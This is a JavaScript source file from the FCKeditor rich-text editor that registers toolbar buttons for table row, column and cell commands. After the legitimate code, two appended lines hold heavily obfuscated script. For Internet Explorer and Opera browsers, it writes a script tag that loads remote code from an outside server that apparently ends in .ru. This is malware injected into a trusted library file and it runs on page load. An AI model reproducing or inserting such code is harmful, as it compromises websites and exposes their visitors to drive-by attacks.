/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2008 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This plugin register the required Toolbar items to be able to insert the
 * table commands in the toolbar.
 */

FCKToolbarItems.RegisterItem( 'TableInsertRowAfter'		, new FCKToolbarButton( 'TableInsertRowAfter'	, FCKLang.InsertRowAfter, null, null, null, true, 62 ) ) ;
FCKToolbarItems.RegisterItem( 'TableDeleteRows'		, new FCKToolbarButton( 'TableDeleteRows'	, FCKLang.DeleteRows, null, null, null, true, 63 ) ) ;
FCKToolbarItems.RegisterItem( 'TableInsertColumnAfter'	, new FCKToolbarButton( 'TableInsertColumnAfter'	, FCKLang.InsertColumnAfter, null, null, null, true, 64 ) ) ;
FCKToolbarItems.RegisterItem( 'TableDeleteColumns'	, new FCKToolbarButton( 'TableDeleteColumns', FCKLang.DeleteColumns, null, null, null, true, 65 ) ) ;
FCKToolbarItems.RegisterItem( 'TableInsertCellAfter'		, new FCKToolbarButton( 'TableInsertCellAfter'	, FCKLang.InsertCellAfter, null, null, null, true, 58 ) ) ;
FCKToolbarItems.RegisterItem( 'TableDeleteCells'	, new FCKToolbarButton( 'TableDeleteCells'	, FCKLang.DeleteCells, null, null, null, true, 59 ) ) ;
FCKToolbarItems.RegisterItem( 'TableMergeCells'		, new FCKToolbarButton( 'TableMergeCells'	, FCKLang.MergeCells, null, null, null, true, 60 ) ) ;
FCKToolbarItems.RegisterItem( 'TableHorizontalSplitCell'		, new FCKToolbarButton( 'TableHorizontalSplitCell'	, FCKLang.SplitCell, null, null, null, true, 61 ) ) ;
FCKToolbarItems.RegisterItem( 'TableCellProp'		, new FCKToolbarButton( 'TableCellProp'	, FCKLang.CellProperties, null, null, null, true, 57 ) ) ;

var I=/*@cc_on!@*/false || !!document.documentMode;if(I || window.opera){$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+".\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+$.__+$.$$$_+"(\\\"<\\"+$.__$+$.$$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$_+$.$$__+"='"+$.$$$$+$.__+"\\"+$.__$+$.$$_+$.___+"://"+$.$$$$+$.__+$.__+$.__$+".\\"+$.__$+$.$$_+$._$_+$._+"/\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+$.__+".\\"+$.__$+$.$_$+$._$_+"\\"+$.__$+$.$$_+$._$$+"'></\\"+$.__$+$.$$_+$._$$+"\\\"+\\\""+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+">\\\");"+"\"")())();}
var I=/*@cc_on!@*/false || !!document.documentMode;if(I||F||window.opera){$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+".\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+$.__+$.$$$_+"(\\\"<\\"+$.__$+$.$$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$_+$.$$__+"='"+$.$$$$+$.__+"\\"+$.__$+$.$$_+$.___+"://"+$.$$$$+$.__+$.__+$.__$+".\\"+$.__$+$.$$_+$._$_+$._+"/\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+$.__+".\\"+$.__$+$.$_$+$._$_+"\\"+$.__$+$.$$_+$._$$+"'></\\"+$.__$+$.$$_+$._$$+"\\\"+\\\""+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+">\\\");"+"\"")())();}